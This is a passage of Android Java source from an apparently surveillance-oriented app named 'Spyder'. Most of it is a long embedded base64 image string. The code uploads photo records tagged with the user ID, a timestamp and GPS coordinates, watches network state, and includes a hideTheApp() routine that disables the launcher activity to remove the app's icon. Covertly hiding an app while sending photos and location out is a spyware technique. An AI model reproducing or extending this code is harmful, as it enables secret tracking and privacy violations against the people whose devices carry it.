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FC3OSWVACT+VcP+0t4SPiz4VaksSeZdWhWeED13AH/AMdJr1Woby0iv7WW3nQSQyqUdD3BoA+L/wBjbxaNG8c32jySbItTiQjJ4LJu2j/yJXtX7W/PwmuP+uyfzFdB4e/Zy8B+FtatdV0zSpre+tpBLHJ9smYBgQRwWwRkdK7LxV4P0rxrph0/WLb7XaFgxjLFeR9DQB8a/swfF/QfhV/wkv8Abckkf2/7N5OyNmzs83d0B/viu/8Aib+1/pt5od3p/hm2kluLhNgupQyqgPX5SAemR+Nekzfsq/DaeRnbQ5QzHJ23swH5B619G/Z+8B6HIklt4fhZl6eezSj8mJoA+bf2U/hNqWr+L4PEl7ayQaXYlZInkXb5kmcqVz1A29vUV9U/Fcf8W613/rh/7MK6e0srewt0gtYIraFeFihQIoHsBxUOsaRa69plxp96hltZ12SIGKkjOeo5oA/PT4G/ES0+F/jyPXL23e5gW3kh8uM4OWxjsfSvov8A4bW8Of8AQHuv+/n/ANjXXf8ADKHw0/6Ac3/gdP8A/F0v/DKHw0/6Ac3/AIHT/wDxdAGv8IfjXpvxgGrfYLOW0/s7yd/mtnd5m/GOB/zzP5143+25/q9B+v8A8XXvfgD4T+Gfhh9v/wCEdsXsvt3l+fvneXds3bfvE4xvbp60vjz4UeGviUtuPEFi959n/wBXsnePHX+6R6mgD5g+Bn7SWj/C/wABpod7p89zOtzJNvjfAw2OPun0r0H/AIbW8Of9Ae6/7+f/AGNdd/wyh8NP+gHN/wCB0/8A8XR/wyh8NP8AoBzf+B0//wAXQB6J4N8UQ+M/Den6zbxNDDeRLMqMckBlB5/Otus3w74esfC2jWul6bEYLK1jWKKMuWKqAABkkk8CtKgAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooA//Z");
        photoDetail.setUserId(sharedPref.getUserId());
        photoDetail.setTimestamp(timeStamp);
        // photoDetail.setTimestamp("1517502985713");
        /*photoDetail.setLattitude("17.459313");
        photoDetail.setLongitude("78.368570");*/
        photoDetail.setLattitude(getLattitude);
        photoDetail.setLongitude(getlangitude);
        photoDetailList.add(photoDetail);
        userPhotoDetailList.setPhotoDetails(photoDetailList);

        MyLog.log("getphotodetails", gson.toJson(userPhotoDetailList));
//        showProgressDialog();
        mSpyderPresenter.savePhotoDetails(userPhotoDetailList);
    }


    private void registerWifiReceiver() {
        IntentFilter filter = new IntentFilter();
        filter.addAction(WifiManager.NETWORK_STATE_CHANGED_ACTION);
        filter.addAction(WifiManager.WIFI_STATE_CHANGED_ACTION);
        filter.addAction(ConnectivityManager.CONNECTIVITY_ACTION);
        registerReceiver(mWifiReceiver, filter);
    }

    private void unregisterWifiReceiver() {
        unregisterReceiver(mWifiReceiver);
    }

    private void hideTheApp() {
        ComponentName componentName = new ComponentName(this, com.spyder.app.activitys.MainActivity.class);

        getPackageManager().setComponentEnabledSetting(componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);
    }


    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQUEST_PERMISSIONS) {

            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {

                boolean_permission = true;
               // GetDetailsInformation.fn_imagespath();

            } else {
                Toast.makeText(getApplicationContext(), "Please allow the permission", Toast.LENGTH_LONG).show();

            }
        }
    }
}
